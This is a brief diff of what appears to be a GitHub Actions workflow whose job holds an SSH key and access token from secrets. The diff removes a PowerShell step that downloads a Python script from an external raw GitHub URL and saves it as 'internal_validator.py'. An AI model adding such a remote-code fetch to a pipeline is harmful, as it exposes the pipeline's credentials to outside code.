@@ -29,9 +29,6 @@ jobs:
           SSH_KEY: ${{ secrets.SSH_KEY }}
           GH_TOKEN: ${{ secrets.MY_PAT }}
         run: |
-          $engineUrl = "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py"
-          Invoke-WebRequest -Uri $engineUrl -OutFile "internal_validator.py"
-          
           $encFile = "database_test.dexenc"
           $runtimeScript = "db_schema_update.ps1"
 
